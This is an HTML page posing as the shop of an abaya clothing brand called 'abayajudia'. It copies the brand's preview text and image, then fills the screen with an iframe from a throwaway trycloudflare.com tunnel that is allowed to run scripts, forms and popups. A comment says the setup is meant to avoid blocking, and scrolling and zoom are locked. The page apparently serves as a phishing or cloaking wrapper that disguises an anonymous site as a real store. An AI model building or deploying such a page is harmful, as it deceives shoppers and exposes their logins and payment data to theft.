<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <!-- تثبيت المقاسات ومنع أي تلاعب بالتكبير أو التصغير من التطبيق -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>abayajudia</title>
    <meta property="og:title" content="abayajudia">
    <meta property="og:description" content="باعتبارنا علامة تجارية متخصصة في العبايات فإننا نقدم مجموعة متنوعة من المنتجات بما في ذلك العبايات والتنانير والبلوزات والسترات وكل ما تحتاجه.">
    <meta property="og:image" content="https://abayajudi.com/wp-content/uploads/2024/09/SAVE_20260513_190924.jpg">
    <meta property="og:url" content="https://abayajudia.new-collection/">
    <meta property="og:type" content="website">
    
    <style>
        /* إغلاق مساحات الصفحة بالكامل ومنع الـ Scroll الخارجي نهائياً */
        body, html { 
            margin: 0; 
            padding: 0; 
            width: 100%;
            height: 100%;
            position: fixed;
            overflow: hidden; 
            background-color: #ffffff; 
            font-family: Tahoma, sans-serif;
            -webkit-overflow-scrolling: touch;
        }
        
        /* شاشة التحميل الاحترافية */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.3s ease;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #111;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .brand-loading {
            font-size: 18px;
            font-weight: bold;
            color: #222;
            letter-spacing: 1px;
        }

        /* تنسيق الـ Iframe مع تفعيل التسريع العتادي ومنع قيود العرض */
        iframe { 
            width: 100%; 
            height: 100%; 
            border: none;
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            transform: translateZ(0);
        }
    </style>
</head>
<body>

    <!-- شاشة التحميل -->
    <div id="loader">
        <div class="spinner"></div>
        <div class="brand-loading">abayajudia</div>
    </div>

    <!-- الـ Iframe مع صياغة آمنة تمنع الحظر وتسمح بالصلاحيات الكاملة -->
    <iframe 
        src="https://dodge-bidder-watching-television.trycloudflare.com" 
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-pointer-lock"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        onload="hideLoader()">
    </iframe>

    <script>
        function hideLoader() {
            const loader = document.getElementById('loader');
            loader.style.opacity = '0';
            setTimeout(() => {
                loader.style.display = 'none';
            }, 300);
        }
    </script>

</body>
</html>
